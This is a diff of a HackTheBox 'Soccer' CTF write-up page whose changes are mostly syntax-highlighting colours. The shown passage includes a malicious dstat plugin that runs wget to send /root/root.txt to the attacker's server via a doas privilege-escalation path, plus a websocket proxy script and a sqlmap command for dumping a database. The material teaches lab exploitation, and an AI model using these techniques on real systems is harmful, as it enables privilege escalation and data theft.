-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>═════════════════════════════╣ Software Information ╠═════════════════════════════
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>═════════════════════════════╣ Software Information ╠═════════════════════════════
 </span></span><span style="display:flex;"><span>                             ╚══════════════════════╝
 </span></span><span style="display:flex;"><span>╔══════════╣ Useful software
 </span></span><span style="display:flex;"><span>/usr/bin/base64
@@ -322,7 +322,7 @@
 </span></span><span style="display:flex;"><span>/usr/bin/sudo
 </span></span><span style="display:flex;"><span>/usr/bin/wget
 </span></span></code></pre></div><p>The <strong>/usr/local/bin/doas</strong> was unknows to me, googling a lit bit about it and like sudo, doas is used to assume the identity of another user on the system. Enumerating its configurations according to this <a href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/doas/">page</a>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>player@soccer:/dev/shm$ find / -type f -name <span style="color:#e6db74">&#34;doas.conf&#34;</span> 2&gt;/dev/null
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>player@soccer:/dev/shm$ find / -type f -name <span style="color:#0086d2">&#34;doas.conf&#34;</span> 2&gt;/dev/null
 </span></span><span style="display:flex;"><span>/usr/local/etc/doas.conf
 </span></span><span style="display:flex;"><span>player@soccer:/dev/shm$ cat /usr/local/etc/doas.conf
 </span></span><span style="display:flex;"><span>permit nopass player as root cmd /usr/bin/dstat
@@ -333,24 +333,24 @@
 <li>Run <code>doas -u root /usr/bin/dstat --&lt;module&gt;</code></li>
 </ol>
 <p>I created a module that simply send a http request with the root.txt content to my server and called it <code>dstat_danp.py</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#fb660a;font-weight:bold">import</span> os
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;wget http://10.10.14.14:8082/$(cat /root/root.txt)&#34;</span>)
+</span></span><span style="display:flex;"><span>os.system(<span style="color:#0086d2">&#34;wget http://10.10.14.14:8082/$(cat /root/root.txt)&#34;</span>)
 </span></span></code></pre></div><p>After sending the file to <code>/usr/local/share/dstat/</code> I was able to run the command <code>doas -u root /usr/bin/dstat --danp</code> and grab the final flag!</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>player@soccer:/dev/shm$ doas -u root /usr/bin/dstat --danp
-</span></span><span style="display:flex;"><span>/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module<span style="color:#e6db74">&#39;s documentation for alternative uses
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  import imp
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">--2023-05-29 20:22:01--  http://10.10.14.14:8082/39278&lt;redacted&gt;0ac1  ### Root flag here
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Connecting to 10.10.14.14:8082... connected.
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">HTTP request sent, awaiting response... 404 File not found
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">2023-05-29 20:22:01 ERROR 404: File not found.
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Module dstat_danp failed to load. (name &#39;</span>dstat_plugin<span style="color:#960050;background-color:#1e0010">&#39;</span> is not defined<span style="color:#f92672">)</span>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>player@soccer:/dev/shm$ doas -u root /usr/bin/dstat --danp
+</span></span><span style="display:flex;"><span>/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module<span style="color:#0086d2">&#39;s documentation for alternative uses
+</span></span></span><span style="display:flex;"><span><span style="color:#0086d2">  import imp
+</span></span></span><span style="display:flex;"><span><span style="color:#0086d2">--2023-05-29 20:22:01--  http://10.10.14.14:8082/39278&lt;redacted&gt;0ac1  ### Root flag here
+</span></span></span><span style="display:flex;"><span><span style="color:#0086d2">Connecting to 10.10.14.14:8082... connected.
+</span></span></span><span style="display:flex;"><span><span style="color:#0086d2">HTTP request sent, awaiting response... 404 File not found
+</span></span></span><span style="display:flex;"><span><span style="color:#0086d2">2023-05-29 20:22:01 ERROR 404: File not found.
+</span></span></span><span style="display:flex;"><span><span style="color:#0086d2">
+</span></span></span><span style="display:flex;"><span><span style="color:#0086d2">Module dstat_danp failed to load. (name &#39;</span>dstat_plugin&#39; is not defined)
 </span></span><span style="display:flex;"><span>None of the stats you selected are available.
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>danp@local:~/Documents/HackTheBox/Soccer|⇒  python3 -m http.server <span style="color:#ae81ff">8082</span>
-</span></span><span style="display:flex;"><span>Serving HTTP on :: port <span style="color:#ae81ff">8082</span> <span style="color:#f92672">(</span>http://<span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:8082/<span style="color:#f92672">)</span> ...
-</span></span><span style="display:flex;"><span>::ffff:10.10.11.194 - - <span style="color:#f92672">[</span>29/May/2023 17:22:07<span style="color:#f92672">]</span> code 404, message File not found
-</span></span><span style="display:flex;"><span>::ffff:10.10.11.194 - - <span style="color:#f92672">[</span>29/May/2023 17:22:07<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /3927&lt;redacted&gt;ac1 HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> - <span style="color:#75715e">### Root flag here</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>danp@local:~/Documents/HackTheBox/Soccer|⇒  python3 -m http.server <span style="color:#0086f7;font-weight:bold">8082</span>
+</span></span><span style="display:flex;"><span>Serving HTTP on :: port <span style="color:#0086f7;font-weight:bold">8082</span> (http://[::]:8082/) ...
+</span></span><span style="display:flex;"><span>::ffff:10.10.11.194 - - [29/May/2023 17:22:07] code 404, message File not found
+</span></span><span style="display:flex;"><span>::ffff:10.10.11.194 - - [29/May/2023 17:22:07] <span style="color:#0086d2">&#34;GET /3927&lt;redacted&gt;ac1 HTTP/1.1&#34;</span> <span style="color:#0086f7;font-weight:bold">404</span> - <span style="color:#080;background-color:#0f140f;font-style:italic">### Root flag here</span>
 </span></span></code></pre></div><h1 id="extra-mile">Extra Mile</h1>
 <h2 id="exploiting-sql-injection-with-sqlmap">Exploiting SQL Injection with SQLMap</h2>
 <p>It is very common to exploit SQL Injection attacks with <code>SQLMap</code>, it is indeed a very powerful tool but by default does not support websockets by default, you must install python&rsquo;s <code>websocket-client</code>. We can exploit it in two ways:</p>
@@ -358,55 +358,55 @@
 <li>Creating a proxy server that forwards the http requests to the websocket server.</li>
 </ol>
 <p>The script below starts a local http server that takes the sqlmap payload, forwards it to the websocket service and returns its response</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> rich<span style="color:#f92672">,</span> json
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> http.server <span style="color:#f92672">import</span> BaseHTTPRequestHandler,HTTPServer
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib.parse
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> websocket <span style="color:#f92672">import</span> create_connection
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#fb660a;font-weight:bold">import</span> rich, json
+</span></span><span style="display:flex;"><span><span style="color:#fb660a;font-weight:bold">from</span> http.server <span style="color:#fb660a;font-weight:bold">import</span> BaseHTTPRequestHandler,HTTPServer
+</span></span><span style="display:flex;"><span><span style="color:#fb660a;font-weight:bold">import</span> urllib.parse
+</span></span><span style="display:flex;"><span><span style="color:#fb660a;font-weight:bold">from</span> websocket <span style="color:#fb660a;font-weight:bold">import</span> create_connection
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">GetHandler</span>(BaseHTTPRequestHandler):
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">do_GET</span>(self):
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Get rid of the favicon request</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>path <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;/favicon.ico&#39;</span>:
-</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>send_response(<span style="color:#ae81ff">200</span>)
-</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>send_header(<span style="color:#e6db74">&#39;Content-Type&#39;</span>, <span style="color:#e6db74">&#39;image/x-icon&#39;</span>)
-</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>send_header(<span style="color:#e6db74">&#39;Content-Length&#39;</span>, <span style="color:#ae81ff">0</span>)
-</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>end_headers()
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span><span style="color:#fb660a;font-weight:bold">class</span> GetHandler(BaseHTTPRequestHandler):
+</span></span><span style="display:flex;"><span>    <span style="color:#fb660a;font-weight:bold">def</span> <span style="color:#ff0086;font-weight:bold">do_GET</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#080;background-color:#0f140f;font-style:italic"># Get rid of the favicon request</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#fb660a;font-weight:bold">if</span> self.path == <span style="color:#0086d2">&#39;/favicon.ico&#39;</span>:
+</span></span><span style="display:flex;"><span>            self.send_response(<span style="color:#0086f7;font-weight:bold">200</span>)
+</span></span><span style="display:flex;"><span>            self.send_header(<span style="color:#0086d2">&#39;Content-Type&#39;</span>, <span style="color:#0086d2">&#39;image/x-icon&#39;</span>)
+</span></span><span style="display:flex;"><span>            self.send_header(<span style="color:#0086d2">&#39;Content-Length&#39;</span>, <span style="color:#0086f7;font-weight:bold">0</span>)
+</span></span><span style="display:flex;"><span>            self.end_headers()
+</span></span><span style="display:flex;"><span>            <span style="color:#fb660a;font-weight:bold">return</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># parse SQLMAP payload</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
-</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>urlparse(self<span style="color:#f92672">.</span>path)
-</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>query[<span style="color:#ae81ff">2</span>:]
-</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>unquote(payload)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span>:
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#080;background-color:#0f140f;font-style:italic"># parse SQLMAP payload</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#fb660a;font-weight:bold">try</span>:
+</span></span><span style="display:flex;"><span>            payload = urllib.parse.urlparse(self.path)
+</span></span><span style="display:flex;"><span>            payload = payload.query[<span style="color:#0086f7;font-weight:bold">2</span>:]
+</span></span><span style="display:flex;"><span>            payload = urllib.parse.unquote(payload)
+</span></span><span style="display:flex;"><span>        <span style="color:#fb660a;font-weight:bold">except</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#fb660a;font-weight:bold">pass</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>send_payload(payload)
-</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>send_response(<span style="color:#ae81ff">200</span>)
-</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>end_headers()
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Write the output on the webpage</span>
-</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>wfile<span style="color:#f92672">.</span>write(str<span style="color:#f92672">.</span>encode(response))
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>        response = self.send_payload(payload)
+</span></span><span style="display:flex;"><span>        self.send_response(<span style="color:#0086f7;font-weight:bold">200</span>)
+</span></span><span style="display:flex;"><span>        self.end_headers()
+</span></span><span style="display:flex;"><span>        <span style="color:#080;background-color:#0f140f;font-style:italic"># Write the output on the webpage</span>
+</span></span><span style="display:flex;"><span>        self.wfile.write(str.encode(response))
+</span></span><span style="display:flex;"><span>        <span style="color:#fb660a;font-weight:bold">return</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Send the payload to the websocket server</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_payload</span>(self, payload):
-</span></span><span style="display:flex;"><span>        ws <span style="color:#f92672">=</span> create_connection(<span style="color:#e6db74">&#34;ws://soccer.htb:9091/&#34;</span>)
-</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;id&#34;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>payload<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>}
-</span></span><span style="display:flex;"><span>        ws<span style="color:#f92672">.</span>send(json<span style="color:#f92672">.</span>dumps(data))
-</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> ws<span style="color:#f92672">.</span>recv()
-</span></span><span style="display:flex;"><span>        ws<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>    <span style="color:#080;background-color:#0f140f;font-style:italic"># Send the payload to the websocket server</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fb660a;font-weight:bold">def</span> <span style="color:#ff0086;font-weight:bold">send_payload</span>(self, payload):
+</span></span><span style="display:flex;"><span>        ws = create_connection(<span style="color:#0086d2">&#34;ws://soccer.htb:9091/&#34;</span>)
+</span></span><span style="display:flex;"><span>        data = {<span style="color:#0086d2">&#34;id&#34;</span>: <span style="color:#0086d2">f</span><span style="color:#0086d2">&#34;</span><span style="color:#0086d2">{</span>payload<span style="color:#0086d2">}</span><span style="color:#0086d2">&#34;</span>}
+</span></span><span style="display:flex;"><span>        ws.send(json.dumps(data))
+</span></span><span style="display:flex;"><span>        response = ws.recv()
+</span></span><span style="display:flex;"><span>        ws.close()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        rich<span style="color:#f92672">.</span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Proxying: </span><span style="color:#e6db74">{</span>data<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> response
+</span></span><span style="display:flex;"><span>        rich.print(<span style="color:#0086d2">f</span><span style="color:#0086d2">&#34;Proxying: </span><span style="color:#0086d2">{</span>data<span style="color:#0086d2">}</span><span style="color:#0086d2">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#fb660a;font-weight:bold">return</span> response
 </span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">log_message</span>(self, format, <span style="color:#f92672">*</span>args):
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fb660a;font-weight:bold">def</span> <span style="color:#ff0086;font-weight:bold">log_message</span>(self, format, *args):
+</span></span><span style="display:flex;"><span>        <span style="color:#fb660a;font-weight:bold">return</span>
 </span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
-</span></span><span style="display:flex;"><span>    rich<span style="color:#f92672">.</span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> =========== STARTING PROXY ===========&#34;</span>)
-</span></span><span style="display:flex;"><span>    server <span style="color:#f92672">=</span> HTTPServer((<span style="color:#e6db74">&#39;localhost&#39;</span>, <span style="color:#ae81ff">8080</span>), GetHandler)
-</span></span><span style="display:flex;"><span>    rich<span style="color:#f92672">.</span>print(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Starting server at http://localhost:8080</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
-</span></span><span style="display:flex;"><span>    server<span style="color:#f92672">.</span>serve_forever()
+</span></span><span style="display:flex;"><span><span style="color:#fb660a;font-weight:bold">if</span> __name__ == <span style="color:#0086d2">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    rich.print(<span style="color:#0086d2">&#34;</span><span style="color:#0086d2">\n</span><span style="color:#0086d2"> =========== STARTING PROXY ===========&#34;</span>)
+</span></span><span style="display:flex;"><span>    server = HTTPServer((<span style="color:#0086d2">&#39;localhost&#39;</span>, <span style="color:#0086f7;font-weight:bold">8080</span>), GetHandler)
+</span></span><span style="display:flex;"><span>    rich.print(<span style="color:#0086d2">&#39;</span><span style="color:#0086d2">\n</span><span style="color:#0086d2">Starting server at http://localhost:8080</span><span style="color:#0086d2">\n</span><span style="color:#0086d2">&#39;</span>)
+</span></span><span style="display:flex;"><span>    server.serve_forever()
 </span></span></code></pre></div><p>Now, all we have to do is point the <code>sqlmap</code> to <code>http://localhost:8080</code> and exploit it normally</p>
 <p><code>sqlmap -u &quot;http://localhost:8080/?p=*&quot; --level 5 --risk 3 --technique=B -T accounts --dump</code></p>
 <p><img src="/soccer-img/sqlmap.png" alt="img13"></p>
